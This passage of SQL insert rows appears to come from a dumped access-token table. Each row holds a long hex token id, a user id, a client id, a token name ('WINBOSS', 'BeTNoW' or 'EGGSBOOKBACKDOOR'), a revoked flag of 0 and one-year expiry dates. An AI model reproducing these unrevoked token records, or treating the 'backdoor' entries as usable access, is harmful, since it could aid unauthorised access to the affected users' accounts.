('1419a329b560e66ed6913a2872a568f9738071e122b53abac17f86154eeea9fd674a28ab2539c012', '846203', 5, 'WINBOSS', '[]', 0, '2023-03-21 10:05:18', '2023-03-21 10:05:18', '2024-03-21 10:05:18'),
('141abc7bd8fdeb10d5a14a67f5bcb04304901a882695553bb6124ecc373516b62e63cbc506f10984', '844643', 5, 'WINBOSS', '[]', 0, '2022-12-25 23:05:07', '2022-12-25 23:05:07', '2023-12-25 23:05:07'),
('143c5edf2e7e7538c8eb1722bba9440c9f32bb492e1b53a87060cf8f75c257f95d28b9d6e268e6f1', '893892', 5, 'WINBOSS', '[]', 0, '2022-12-10 13:38:57', '2022-12-10 13:38:57', '2023-12-10 13:38:57'),
('14461fbf75e70197d1ee11c9b6448657e96a06b4189b6cec8acaed35ac7189245220fa1b1f2d7d4f', '898184', 5, 'WINBOSS', '[]', 0, '2022-07-18 10:47:20', '2022-07-18 10:47:20', '2023-07-18 10:47:20'),
('146334e6355c36a08977edcb19b376518132e41d419db7434d89e68bc12abed38ccafc0569d866f7', '244427', 5, 'WINBOSS', '[]', 0, '2022-06-28 08:18:23', '2022-06-28 08:18:23', '2023-06-28 08:18:23'),
('1475bdadc9e0128647d3ac23c002b96e2a6a1b730a32023258c53235eb144b33e4391c1f4075eebb', '899039', 5, 'WINBOSS', '[]', 0, '2023-11-28 21:42:06', '2023-11-28 21:42:06', '2024-11-28 21:42:06'),
('1482eea1039b7291ae28efdd6ae09f03aaef4cbd3d25c5828311da93ed3fb51a5797e2a3d23c77a2', '622165', 5, 'WINBOSS', '[]', 0, '2023-11-11 12:12:01', '2023-11-11 12:12:01', '2024-11-11 12:12:01'),
('14966266facacbc3a300c0bd3ae9e86956f1412ea2301473cb6fe8d96c4c5ec632ffe67720c3dbfd', '666832', 5, 'WINBOSS', '[]', 0, '2022-06-28 08:15:32', '2022-06-28 08:15:32', '2023-06-28 08:15:32'),
('14aeaeb58fdd40d01e8bace6fe5d8ee95cd8cf38e861535166264535df7cc0ef08bc693470b6e6bb', '997493', 5, 'WINBOSS', '[]', 0, '2023-01-13 10:07:44', '2023-01-13 10:07:44', '2024-01-13 10:07:44'),
('14b1c0cd8feb6ba22dd8a6962f9bbc992da996c5978c85c68da28986317fc82d2fb1c8b3b0f43c71', '430741', 5, 'WINBOSS', '[]', 0, '2022-06-28 08:21:28', '2022-06-28 08:21:28', '2023-06-28 08:21:28'),
('14ca4d95dfc79a5334d9851c8190dfb93b6d8670c55bd3f8b2f426eb8c107c5527549353cb5ea989', '976453', 5, 'WINBOSS', '[]', 0, '2023-12-23 08:01:50', '2023-12-23 08:01:50', '2024-12-23 08:01:50'),
('14e1ce783673deb6d98d8fdb55818c7024b4e95cd756378571284ca4ef6c6cafae386a6bb6ce5529', '584262', 5, 'WINBOSS', '[]', 0, '2023-11-05 00:47:19', '2023-11-05 00:47:19', '2024-11-05 00:47:19'),
('14e91f3e96aca8b61ff78fa9b625d7c46c2364e3fe110b68fcc6db98d11ae133f0cd0f0b8fdacaf6', '679424', 5, 'WINBOSS', '[]', 0, '2023-04-06 11:19:21', '2023-04-06 11:19:21', '2024-04-06 11:19:21'),
('150a0d47d93ac94d07420bde932cb999e975152b5bb7d27d9661e04f8005245c119bbf64e899a2a2', '849645', 5, 'WINBOSS', '[]', 0, '2023-02-27 04:19:16', '2023-02-27 04:19:16', '2024-02-27 04:19:16'),
('150a83ed15a7947014b5fc1421eaeac4a9b83a1c952314b5d8348963ed462ca781835abdb1dafc59', '622151', 5, 'WINBOSS', '[]', 0, '2023-06-12 06:02:51', '2023-06-12 06:02:51', '2024-06-12 06:02:51'),
('154e7c2964a1c51565803f811ea0f38b15462ce5e6fd92bd0e83faccbf92d7cfeff8956220e2c5c9', '283664', 5, 'WINBOSS', '[]', 0, '2022-12-08 11:20:50', '2022-12-08 11:20:50', '2023-12-08 11:20:50'),
('1557780755345857ae16119feb570add98d617503c121c57958da23332d3e8aff80296df3195ccd2', '691571', 5, 'WINBOSS', '[]', 0, '2022-11-20 07:22:04', '2022-11-20 07:22:04', '2023-11-20 07:22:04'),
('1572f942ac01a3d5faf962fbbd40e121503e7ed92a744a66de73f85434fc2b9c8e1ccb162adcd3a8', '717430', 5, 'WINBOSS', '[]', 0, '2023-06-30 16:40:07', '2023-06-30 16:40:07', '2024-06-30 16:40:07'),
('158c85403ba7113251aac0b6994aee12999bd9da38371d9e86f55f48662603cd67d5feec987243fa', '380514', 5, 'WINBOSS', '[]', 0, '2023-10-11 15:55:02', '2023-10-11 15:55:02', '2024-10-11 15:55:02'),
('159309b8a00d9f41f30f21f18a003440d528890c5ad675aa66442a96a780c50132dcb7122e3d3c29', '339591', 5, 'WINBOSS', '[]', 0, '2023-10-15 10:14:15', '2023-10-15 10:14:15', '2024-10-15 10:14:15'),
('15b53d241f042e5bba2b7cb4a2cc6992018e9e1717ad5a1bc84fc53d5990fe6c7942ea9b643106d8', '740262', 5, 'WINBOSS', '[]', 0, '2024-01-22 13:16:08', '2024-01-22 13:16:08', '2025-01-22 13:16:08'),
('15b8e80afda0c03e7791b83287dcd1753b7456ec033c5b9e0019c72e0375e8652dfc74f16ca0c2d2', '287086', 5, 'WINBOSS', '[]', 0, '2022-10-25 17:15:07', '2022-10-25 17:15:07', '2023-10-25 17:15:07'),
('15d0b191e6d8a328f4de064eba87a3d99195ec09ba7af940690da004d45d5deaa81e5854e3d838ab', '176992', 5, 'WINBOSS', '[]', 0, '2023-08-15 08:56:43', '2023-08-15 08:56:43', '2024-08-15 08:56:43'),
('15d4b35bccd7aec65e1e8dcd4b66241f204270600d3c4162493002f470d092fd2145fa528653fb4a', '369925', 5, 'WINBOSS', '[]', 0, '2023-07-17 05:31:27', '2023-07-17 05:31:27', '2024-07-17 05:31:27'),
('15ef23222bd7a30eca228eb7b1c8bc2b6ed980c156c03652b6d3a1535946eba4d1d49ba7d37d6075', '367907', 5, 'WINBOSS', '[]', 0, '2023-07-25 12:06:35', '2023-07-25 12:06:35', '2024-07-25 12:06:35'),
('16c30d1ddfedfe44044c9c66d253d2c6893ef52ee5045a5d1ed3d7fe2ccd0787951eb4cc17e5ac58', '449976', 5, 'WINBOSS', '[]', 0, '2022-09-18 04:27:45', '2022-09-18 04:27:45', '2023-09-18 04:27:45'),
('173dff257a10ab201b342eaae49c3c25e06884bde66a2d061f744ed2aa6629573bab81545d821a4f', '215625', 5, 'WINBOSS', '[]', 0, '2023-11-02 04:27:02', '2023-11-02 04:27:02', '2024-11-02 04:27:02'),
('177110ee7e49eecbc12f2cacc2ff006c0198e138b4c9bc2940389871f756cfda40e3a865ec74e942', '311594', 5, 'WINBOSS', '[]', 0, '2023-03-14 09:44:44', '2023-03-14 09:44:44', '2024-03-14 09:44:44'),
('17a85d5688e3458956c2a7c7b043ea2df39313ff4b510525fa2fce917fbee83b24ef9695822bb8b4', '879330', 5, 'WINBOSS', '[]', 0, '2022-06-28 08:22:55', '2022-06-28 08:22:55', '2023-06-28 08:22:55'),
('17b69650a87db194d70965c9020076a9b116614764f40776f6d40a2feafee2ca1e913c46560ae9c2', '595906', 5, 'BeTNoW', '[]', 0, '2022-11-19 02:27:22', '2022-11-19 02:27:22', '2023-11-19 02:27:22'),
('17d8be7e41b254a87a901cc0e65519c1c2f45d0e6ad8a70e7de0ad61de0a66aeea5c0d867686c9be', '480622', 5, 'WINBOSS', '[]', 0, '2022-12-30 20:29:07', '2022-12-30 20:29:07', '2023-12-30 20:29:07'),
('17d9cc9be25b92b171b9dd183103cd501099bd8d1d5c48ffc798afdaecef4d534a46215aaade650c', '773348', 5, 'WINBOSS', '[]', 0, '2023-08-15 09:18:06', '2023-08-15 09:18:06', '2024-08-15 09:18:06'),
('183b21c1290c820e7804715af7fc79ac04234dac7f0241ed8fc00d774d1a68e02bdf5436e25510da', '804240', 5, 'WINBOSS', '[]', 0, '2022-12-26 14:23:19', '2022-12-26 14:23:19', '2023-12-26 14:23:19'),
('184e531784d89331757d66ea47677a1b7916c3655bf9454ba30ebceb898d053f47176247968b5b40', '788776', 5, 'WINBOSS', '[]', 0, '2022-12-25 19:47:06', '2022-12-25 19:47:06', '2023-12-25 19:47:06'),
('18a3fc51dd2688078ebe425b446c4de75412636c0b2e238932a191c49d8286929b52d674efaa03fe', '108950', 5, 'WINBOSS', '[]', 0, '2022-12-10 13:14:06', '2022-12-10 13:14:06', '2023-12-10 13:14:06'),
('18c9d0983226443d42e4544304e97747f9e5c705edd9dbb09c89769cc71c5f96637c347f771b6674', '617873', 5, 'WINBOSS', '[]', 0, '2023-06-26 10:15:01', '2023-06-26 10:15:01', '2024-06-26 10:15:01'),
('18e4df840a0f928c894eb778c321905bcff95b9199fbe95dd62c2c95028eabb75740b9ef8eb851e9', '795580', 5, 'WINBOSS', '[]', 0, '2023-10-15 11:07:57', '2023-10-15 11:07:57', '2024-10-15 11:07:57'),
('18ec1d7ceaaa7d310c918adf296dba2e02eb019a8777f7b48649f0d27d41a085a9497f35764ae343', '937364', 5, 'WINBOSS', '[]', 0, '2023-11-02 07:45:29', '2023-11-02 07:45:29', '2024-11-02 07:45:29'),
('18f88091e1a351e1ca917b6af65a77768bec73cbcde400b43c6dc7d5bb3a2e78aad71c7a7ec2aff1', '915951', 5, 'WINBOSS', '[]', 0, '2023-01-15 05:21:58', '2023-01-15 05:21:58', '2024-01-15 05:21:58'),
('1947673354e38e40232ada0970a1c8f3699d6fa10ed508cb2ef640561a7b17592b75a85b5f120fb8', '433385', 5, 'WINBOSS', '[]', 0, '2024-01-05 15:17:13', '2024-01-05 15:17:13', '2025-01-05 15:17:13'),
('19917eabd394851a6959dd0fd70a69e77423153494118c6b1d3ddc8979ef5f9a0e81db3f5babeab0', '336693', 5, 'WINBOSS', '[]', 0, '2024-01-22 04:25:40', '2024-01-22 04:25:40', '2025-01-22 04:25:40'),
('19c1289f2b7c4c86d3ad527f60f41f05a61223656c041445238e17177c92867e06626cecba254c05', '666325', 5, 'WINBOSS', '[]', 0, '2022-07-13 04:27:15', '2022-07-13 04:27:15', '2023-07-13 04:27:15'),
('19fdc89e0b166bfd66240777b33ffc9f4a5e68c3f3f376b620bb1b58378d69064c2a353fcdefe3ed', '229579', 5, 'WINBOSS', '[]', 0, '2022-12-07 14:15:12', '2022-12-07 14:15:12', '2023-12-07 14:15:12'),
('1a0e24ea6142c40f08a01286ba3183d68a766442537c84faf4ee6b18059ef0e8d37313a813fe4a74', '392199', 5, 'WINBOSS', '[]', 0, '2023-07-05 09:08:49', '2023-07-05 09:08:49', '2024-07-05 09:08:49'),
('1a15d01b60706526d35e1a8a2dbfd820dad5c2c10fa862841067ec700888c33f93d684163435c595', '345374', 5, 'WINBOSS', '[]', 0, '2022-12-26 05:50:14', '2022-12-26 05:50:14', '2023-12-26 05:50:14'),
('1a23bb161d3ef1da84cc51f7e746fde0e190edf883b7dd1ba410574a5e5fde6d9679cf3528e921dc', '345808', 5, 'WINBOSS', '[]', 0, '2023-10-23 06:23:51', '2023-10-23 06:23:51', '2024-10-23 06:23:51'),
('1a3585d247761a92d43639e4ef1c4fe98edaef3e78338de04e992dd2ac6bccada329b228f6bb15e2', '847444', 5, 'WINBOSS', '[]', 0, '2022-09-03 14:53:11', '2022-09-03 14:53:11', '2023-09-03 14:53:11'),
('1a4cd1bbeac6986fa99e160a7ec81aafc2bf595d4258f9a4f3fcc411d5baeadf26499adf1721f398', '940008', 5, 'WINBOSS', '[]', 0, '2023-11-10 04:42:18', '2023-11-10 04:42:18', '2024-11-10 04:42:18'),
('1a810d910bb81d3552cda5b3171d92b3d03ad9c69ea94a0890370aef78731310b2da10fed5cc336c', '381539', 5, 'WINBOSS', '[]', 0, '2022-12-27 18:15:55', '2022-12-27 18:15:55', '2023-12-27 18:15:55'),
('1aad19325ac2dd7691a7cd00e6118f5e6d17cd9c49b2cd385853e39ea6c01e9322426cce3258c8e0', '531746', 5, 'WINBOSS', '[]', 0, '2023-09-01 05:16:42', '2023-09-01 05:16:42', '2024-09-01 05:16:42'),
('1ad3622761a88d96cb93097d54b73719f1923bc5e0636330f7f8e85b7ecae572846bbcc29152d226', '189670', 5, 'WINBOSS', '[]', 0, '2023-11-12 07:32:21', '2023-11-12 07:32:21', '2024-11-12 07:32:21'),
('1ada0b755640f496cf450f9d9eaf248007956513a567bfa164e2b6fb48e03d832808f54f628f27ca', '173311', 5, 'WINBOSS', '[]', 0, '2023-12-13 15:12:39', '2023-12-13 15:12:39', '2024-12-13 15:12:39'),
('1aee612ed819306e8b480285e5bda0820a9620619bf739065fedc50b2068be04faed96844c2bca2e', '327738', 5, 'WINBOSS', '[]', 0, '2022-11-19 08:33:54', '2022-11-19 08:33:54', '2023-11-19 08:33:54'),
('1b19a11c1e9d5a34e69508ff51ee53f069b175ee1784cd9eac2b6d9b4e0336ff5cd5a50fd20d1ba3', '635862', 5, 'WINBOSS', '[]', 0, '2023-12-29 09:06:49', '2023-12-29 09:06:49', '2024-12-29 09:06:49'),
('1b6d19efae5dd929b905adbb2289c928e24cd244b9b37a92114b8b66c71297ec46eac7a0bb3f8bd0', '829234', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-12-16 04:16:26', '2022-12-16 04:16:26', '2023-12-16 04:16:26'),
('1bea35395fee951d95da38ea2aef15cb7c1e74015368204629de91dca2559f764d30ca189cff6260', '794381', 5, 'WINBOSS', '[]', 0, '2023-07-20 05:03:46', '2023-07-20 05:03:46', '2024-07-20 05:03:46'),
('1bef0d05c1b9025f38387aa5b751c605634c5e77d9fde2ba971a16d6ac2f693094dae63c2bb00fe8', '270665', 5, 'WINBOSS', '[]', 0, '2022-09-12 02:59:39', '2022-09-12 02:59:39', '2023-09-12 02:59:39'),
('1bf60c5617281a6ab4a72d343a4456aba4fc4f0199e855624a3a009b6b3e70ed0253b3347d6ba023', '226069', 5, 'WINBOSS', '[]', 0, '2022-12-11 05:31:32', '2022-12-11 05:31:32', '2023-12-11 05:31:32'),
('1bf73511572e403357292231adbe98576f37f736b73a20bc9d1c1d1b8c1d7ecd0b5339f0c578c477', '719149', 5, 'WINBOSS', '[]', 0, '2022-12-19 14:32:33', '2022-12-19 14:32:33', '2023-12-19 14:32:33'),
('1c2a51273968dbf67d68b56afd62fadacf40f1c60b10c5a1877877dc1fb6a5a9976e904aad77fc20', '560260', 5, 'WINBOSS', '[]', 0, '2022-12-27 19:40:23', '2022-12-27 19:40:23', '2023-12-27 19:40:23'),
('1c37f8b65f8ba6ea518815b9d358c465eac97c078fdeb084a4335d9b58152fbcb385bc4e58810956', '412034', 5, 'WINBOSS', '[]', 0, '2022-12-16 11:03:49', '2022-12-16 11:03:49', '2023-12-16 11:03:49'),
('1c41eac8a2c6807eacd6d2306df737c0c4c27464b7ed7cd989e9557dc2e9fd7f18eb83a6ac7871cd', '643270', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-11-21 10:16:18', '2022-11-21 10:16:18', '2023-11-21 10:16:18'),
('1c9eeabcfb0365952830de231cc0135eccad8784a86dd5bcefa6c0d6b61c73bbaa467845d7afc4a4', '180853', 5, 'WINBOSS', '[]', 0, '2023-07-26 17:35:26', '2023-07-26 17:35:26', '2024-07-26 17:35:26'),
('1ccabbdffb5888eb21d90dbf6a73200dad3a5610e80598bf09ed5b8898f5aa8aef1001ba5f68fc44', '534342', 5, 'WINBOSS', '[]', 0, '2023-11-06 04:53:57', '2023-11-06 04:53:57', '2024-11-06 04:53:57'),
('1cd79502d200e3d366b0582237de78208dbe48a6242439b3ec9dfaaa31d3c762267a6054b5ea5234', '674426', 5, 'BeTNoW', '[]', 0, '2022-06-29 09:48:20', '2022-06-29 09:48:20', '2023-06-29 09:48:20'),
('1cd7f67371f325d81dd42d1299539ac2de6d5ca6115795a2364e78b90f349bd5fe720c1e6c4c2eba', '177757', 5, 'WINBOSS', '[]', 0, '2023-11-15 06:54:35', '2023-11-15 06:54:35', '2024-11-15 06:54:35'),
('1cdf91e28e489686a122f79baefb978a4a16940e905549a95c0a7fc9a397344b939c237bd5c58d87', '485365', 5, 'WINBOSS', '[]', 0, '2022-10-05 18:46:52', '2022-10-05 18:46:52', '2023-10-05 18:46:52'),
('1cfe3eb2b31bcb5db9d14800d628d0e166f4e32413d273df34662a6d3779c7fc727291a068b5acc7', '724491', 5, 'WINBOSS', '[]', 0, '2024-01-17 06:36:27', '2024-01-17 06:36:27', '2025-01-17 06:36:27'),
('1d164dce37960d4b016d2e08e3c9ced49e2ba32520f5fba7d98fecbd2b00f41720d48ba682900680', '368307', 5, 'WINBOSS', '[]', 0, '2022-12-29 08:23:56', '2022-12-29 08:23:56', '2023-12-29 08:23:56'),
('1d2436ae868fdad481a7793bfd96ae57f59066219b35dd1a023d442f8eb7d5d6b1b2cd0913e35edb', '940615', 5, 'WINBOSS', '[]', 0, '2023-07-14 03:26:33', '2023-07-14 03:26:33', '2024-07-14 03:26:33'),
('1d2e69a4440160be4d244fbbef1e588edd5a59df1e02f48b9bea725b890d8858cf1a58495eff1084', '794051', 5, 'WINBOSS', '[]', 0, '2023-09-04 17:58:43', '2023-09-04 17:58:43', '2024-09-04 17:58:43'),
('1dd44f9e224e09203341377ed53f5c2919520b31d4a7428de57ee22aa256401c98fda6abd19936b9', '353306', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-11-08 04:26:04', '2023-11-08 04:26:04', '2024-11-08 04:26:04'),
('1ddfec53b2a6dc3ccf6482323d9b1cf0256328e2e9bdc19595753fc5cba4360efe235ed4d3f5938c', '561299', 5, 'WINBOSS', '[]', 0, '2022-06-28 08:19:51', '2022-06-28 08:19:51', '2023-06-28 08:19:51'),
('1de0ed8e8bcdfcdc189116eb03b87ac2784e8cba85ff05b7e460b7fa6df005344bd60c6e30a86386', '863693', 5, 'WINBOSS', '[]', 0, '2023-03-21 10:08:55', '2023-03-21 10:08:55', '2024-03-21 10:08:55'),
('1de4840073716fc969cdf72214f22d51f36bca6aab3a425546b40a2087b89e5f5639e7d654e91453', '918567', 5, 'WINBOSS', '[]', 0, '2022-06-28 08:02:12', '2022-06-28 08:02:12', '2023-06-28 08:02:12'),
('1ea2dd46efcc0bb9b640b1720864110822e290f50e788799eb4a7c0aa77534de8a1815898459dcd8', '236851', 5, 'WINBOSS', '[]', 0, '2023-04-24 18:57:02', '2023-04-24 18:57:02', '2024-04-24 18:57:02'),
('1ee2312ec82d8e2e283eb0a5e608887375c6d357f4ae3d32a9ffe3a3bff5882755423ca340fd37ef', '937481', 5, 'WINBOSS', '[]', 0, '2022-07-14 17:19:10', '2022-07-14 17:19:10', '2023-07-14 17:19:10'),
('1eefc900eb7000fe5ba2ccba6b6852734aae045d2f4ff0fb9e9dc42a8593bfaf3c381906897fbeaa', '252080', 5, 'WINBOSS', '[]', 0, '2023-03-24 04:52:11', '2023-03-24 04:52:11', '2024-03-24 04:52:11'),
('1f27105add9461eb56e9b70b8d0736bd92222ae47fedb14ae9565a957fb1824126342771af1dbd4a', '705670', 5, 'WINBOSS', '[]', 0, '2023-08-25 17:51:44', '2023-08-25 17:51:44', '2024-08-25 17:51:44'),
('1f27b3f3e00a0ae81392734ac06562f1de3d8b7abeca951d292f4fa6ac0f4632321927768a74e841', '927102', 5, 'WINBOSS', '[]', 0, '2024-01-13 12:48:37', '2024-01-13 12:48:37', '2025-01-13 12:48:37'),
('1f7621a4e558331f7ae6d1e4aa1a43166c5dfc68ab2e5b5966516c850e927687d3979c020add79f9', '703295', 5, 'WINBOSS', '[]', 0, '2022-12-27 19:17:15', '2022-12-27 19:17:15', '2023-12-27 19:17:15'),
('1ff2aa231b39b982c2a3bc885425a4f8f4fda28537713cdc775159f744980f89249236e94a02a7aa', '209338', 5, 'WINBOSS', '[]', 0, '2023-01-16 02:16:31', '2023-01-16 02:16:31', '2024-01-16 02:16:31'),
('2046704715374fd7b478160cd371832e8fda9d87c16ee5a3ed73c2a477b3c10ef7c1b8bf371de593', '588045', 5, 'WINBOSS', '[]', 0, '2023-04-01 04:08:55', '2023-04-01 04:08:55', '2024-04-01 04:08:55'),
('20761d442b2a11f39f3783fc0570e8c8a71f7de0b7f5f89b7da39052917d8be71d58483b0640c1c1', '712067', 5, 'WINBOSS', '[]', 0, '2023-01-02 19:19:22', '2023-01-02 19:19:22', '2024-01-02 19:19:22'),
('20b50564d485f49c6ab53a5b0da2e487fed3b754957e797648ab034e546552405ce8b2a5cc345669', '362808', 5, 'WINBOSS', '[]', 0, '2022-07-18 21:38:38', '2022-07-18 21:38:38', '2023-07-18 21:38:38'),
('2126af90fdf5eeafc176b4cad07fddecfce21bd87cd4b1ade81349c9ec67f6bddbb85cea09f1b329', '152495', 5, 'WINBOSS', '[]', 0, '2022-06-28 08:22:16', '2022-06-28 08:22:16', '2023-06-28 08:22:16'),
('21827cbfb0f47842f5cc86e84da3757339ce61ae5ce5446cf560e287482f7d1fe65d45c6f4a02af8', '171851', 5, 'WINBOSS', '[]', 0, '2023-02-09 01:34:15', '2023-02-09 01:34:15', '2024-02-09 01:34:15'),
('2189e36588e678374e2976c2a888484b0525c9fbdf713b0f3374e62a4035484765afeedcd47ec2ac', '296764', 5, 'WINBOSS', '[]', 0, '2023-07-01 07:34:18', '2023-07-01 07:34:18', '2024-07-01 07:34:18'),
('21fb217fcdf167b67b8565e67be7c0790ab0edf53269a61f88828b6c24c6f415651891a17b9409e1', '950269', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-09-10 15:16:38', '2022-09-10 15:16:38', '2023-09-10 15:16:38'),
('22438b7f2f9f8b7fda22bf9b7d02f053000a22e3a05240295039e6f6372c3f360e2a930e1dc42e95', '410976', 5, 'WINBOSS', '[]', 0, '2022-08-06 03:27:39', '2022-08-06 03:27:39', '2023-08-06 03:27:39'),
('2259df60602697a44b7dc30a87c3292572ceea65453c51f3770f925323baabae48fdc1f8c19fcc3d', '756571', 5, 'WINBOSS', '[]', 0, '2023-05-31 05:47:18', '2023-05-31 05:47:18', '2024-05-31 05:47:18'),
('22674718fa19aa3d288bebcaff0c21084ff0f83fcf18092af629d00cfadd15b880fddf27eb9bdd44', '445885', 5, 'WINBOSS', '[]', 0, '2023-09-10 02:17:02', '2023-09-10 02:17:02', '2024-09-10 02:17:02'),
('22ee89cefa31426bcb55f5001821b30d048449cc329536ca9a2759118e69bc68473901d10a0506fa', '338293', 5, 'WINBOSS', '[]', 0, '2022-07-06 15:21:51', '2022-07-06 15:21:51', '2023-07-06 15:21:51'),
('22f896e057c1edfd614d3b11dcae9cbb676cc1ffdfcac8f1f72f3397a4bbd81f47693aabc86c531b', '103139', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-02-17 09:51:24', '2023-02-17 09:51:24', '2024-02-17 09:51:24'),
('2331f802a4d7cfcfd2caf2c04d465e5b7232e0aaaa673414d036a1acebac48f2feb8076b3508741d', '108197', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-10-11 04:35:51', '2023-10-11 04:35:51', '2024-10-11 04:35:51'),
('2375ad75769b2259010364cd168d1af3a79064a35d80180efff3977e58f4729155c97373f260cd02', '356311', 5, 'WINBOSS', '[]', 0, '2023-01-06 14:51:02', '2023-01-06 14:51:02', '2024-01-06 14:51:02'),
('24c44a2780ab8d0aec2545ca1b0a25a704d4ca5dfb9b33697169190c572a42e2c48e0ea6188fecd6', '685733', 5, 'WINBOSS', '[]', 0, '2023-09-19 09:44:32', '2023-09-19 09:44:32', '2024-09-19 09:44:32'),
('24cc592cf1948f71637334c33bd241561f12f1ad34eca618ab3a60fde7f21d5985051c4ed1b1ffb7', '515160', 5, 'WINBOSS', '[]', 0, '2022-09-12 05:08:22', '2022-09-12 05:08:22', '2023-09-12 05:08:22'),
('24f0c0fc6e42aa10eba5dc2d86ce325648225db18d1fcddfbda1fd51dc691766a1ab9223601e7712', '551639', 5, 'WINBOSS', '[]', 0, '2022-12-30 22:17:09', '2022-12-30 22:17:09', '2023-12-30 22:17:09'),
('2500f98184ff2508094cb4a077cc71836ff72fa3767cdebe2a9805337c07e1438816c5f1a7fc7a35', '579725', 5, 'WINBOSS', '[]', 0, '2023-08-10 07:25:51', '2023-08-10 07:25:51', '2024-08-10 07:25:51'),
('2546d000c715bd2afb7fe0916cb1998dcd6c199035f605dd45433b8df06ca4129e6cb284adad1897', '725020', 5, 'WINBOSS', '[]', 0, '2022-12-10 14:56:15', '2022-12-10 14:56:15', '2023-12-10 14:56:15'),
('256262040daf7e4fef9794693d5e99f152f41181a09ed9a3076fa517dea768056eb1c34008f4c1ee', '187119', 5, 'WINBOSS', '[]', 0, '2022-06-28 08:21:38', '2022-06-28 08:21:38', '2023-06-28 08:21:38'),
('256d05b673ffd8857aa8fc3c9afd8ea85cd5c2d468be5b8b301651f30b5c03c91f18baa87549bd41', '637278', 5, 'WINBOSS', '[]', 0, '2023-11-13 02:20:09', '2023-11-13 02:20:09', '2024-11-13 02:20:09'),
('259880d43b2e27f10ec5c6d5259bf1c39a5d51f40f1e63506b26976434f6a6a5ae03c171762b396b', '942978', 5, 'WINBOSS', '[]', 0, '2022-12-17 10:34:47', '2022-12-17 10:34:47', '2023-12-17 10:34:47'),
('25e15f1d418e168ffe40744ae244a80e862c091e846f83f307833a6a9ca7c860db963deeb8e15ce8', '115372', 5, 'WINBOSS', '[]', 0, '2022-12-30 03:53:22', '2022-12-30 03:53:22', '2023-12-30 03:53:22'),
('268ebaf6226e9860f50b8ce9ed568b16d6d48e9a15074e124f276b781bc61ed035d33daba6512c1a', '294176', 5, 'WINBOSS', '[]', 0, '2023-12-29 02:32:38', '2023-12-29 02:32:38', '2024-12-29 02:32:38'),
('26c558ea72d1d275d40514c80e95792b8f92db95a506147faec6e5cde6fba6015361084d29b7a82e', '625873', 5, 'WINBOSS', '[]', 0, '2023-01-20 16:34:37', '2023-01-20 16:34:37', '2024-01-20 16:34:37'),
('26cd49adf04abf7952c5403288980cd38f4e6c4fb0cd3c24e0be35033fe0817009b5bcf8ff5112c1', '130564', 5, 'WINBOSS', '[]', 0, '2023-03-03 21:11:51', '2023-03-03 21:11:51', '2024-03-03 21:11:51'),
('26e0f19a79902f88a314e41026da6f9a024071d968b3a0a91c3011af15b4f0b874ce5dfff6a27624', '423671', 5, 'WINBOSS', '[]', 0, '2023-01-01 03:57:50', '2023-01-01 03:57:50', '2024-01-01 03:57:50'),
('26e954c102c9504047935e5a6638c08a323db10a4a93923fd21ebcded8c015c3c0e61ea6c0e573bb', '401078', 5, 'WINBOSS', '[]', 0, '2023-04-11 11:19:43', '2023-04-11 11:19:43', '2024-04-11 11:19:43'),
('276e5fbf20c1e3b63d522d451f1092d970c5d3570534a63c38e6582722f3fc7704df995422c57712', '846782', 5, 'WINBOSS', '[]', 0, '2023-11-10 17:15:01', '2023-11-10 17:15:01', '2024-11-10 17:15:01'),
('279431d31b3b196ec38a3d8b6822958caba9ea961dac33e716aa82df3688a00b38433220a7b9773d', '259683', 5, 'WINBOSS', '[]', 0, '2024-01-14 06:52:50', '2024-01-14 06:52:50', '2025-01-14 06:52:50'),
('27b221fd2eaed762f7f2ef4aeb0a6d928dea44f976ad00a8556f3a24dc6a6478cf8c65d36048930d', '216950', 5, 'WINBOSS', '[]', 0, '2022-12-02 04:28:48', '2022-12-02 04:28:48', '2023-12-02 04:28:48'),
('27c119d348470e82dbf077569d973e36736f51674ac0259b2ff96bf2bcf2c77025575bdcf3b2e010', '918930', 5, 'WINBOSS', '[]', 0, '2022-11-20 03:27:18', '2022-11-20 03:27:18', '2023-11-20 03:27:18'),
('27d5f1d5886a3de6b9897a6f84052933c865039e1498d98bbd38d801de423c56a53c2b7dfef62d6a', '741534', 5, 'WINBOSS', '[]', 0, '2023-06-18 12:04:18', '2023-06-18 12:04:18', '2024-06-18 12:04:18'),
('283b415d609eee7866baf85e32c47b937e53b14cb3b5bf1221d80e006005972348d2b83f07da4a93', '725655', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-12-06 03:07:24', '2023-12-06 03:07:24', '2024-12-06 03:07:24'),
('287aea351bafa9b3e8e79d620718baa4d4feff54f6b233684c56e4c0e8a29ea4305594302fa81837', '459411', 5, 'WINBOSS', '[]', 0, '2023-08-01 06:16:12', '2023-08-01 06:16:12', '2024-08-01 06:16:12'),
('28afdcabd6df5f46d854ca4acbea466c076ec64b7d3e304619143e0888db997b7b3bdcfb9b292996', '876764', 5, 'WINBOSS', '[]', 0, '2022-10-19 19:06:01', '2022-10-19 19:06:01', '2023-10-19 19:06:01'),
('28efe569a9f4093d04169727edd02ca9b1fd0ceeec8e8547e86f5feb37c8d0f05e98b6199954b039', '420067', 5, 'WINBOSS', '[]', 0, '2023-12-13 05:16:49', '2023-12-13 05:16:49', '2024-12-13 05:16:49'),
('29008d09e9d5e3925499fd4d00ad4a25ee64b8c456efbb1e222a6b20323e94f3dec22a137a202f89', '461967', 5, 'WINBOSS', '[]', 0, '2023-03-30 04:07:03', '2023-03-30 04:07:03', '2024-03-30 04:07:03'),
('2915b8d14c20c0fea93dc7de438dcb749e9e3e2245cb6f79f1469981f87f26cbc31f7d5a57974b60', '108217', 5, 'WINBOSS', '[]', 0, '2023-07-20 05:09:05', '2023-07-20 05:09:05', '2024-07-20 05:09:05'),
('295062d75f3a9bb76a9732f2ff884252b9844715b75d98ad413cd797c6958b3e9aaab3d17afb9f69', '340780', 5, 'WINBOSS', '[]', 0, '2022-12-08 05:40:05', '2022-12-08 05:40:05', '2023-12-08 05:40:05'),
('297c80b3d8f1bf8da4c4f422026422dd389d7cf4e18e250a2fa1da2ce415a8158de3a36fe06617aa', '190674', 5, 'WINBOSS', '[]', 0, '2023-12-17 09:25:51', '2023-12-17 09:25:51', '2024-12-17 09:25:51'),
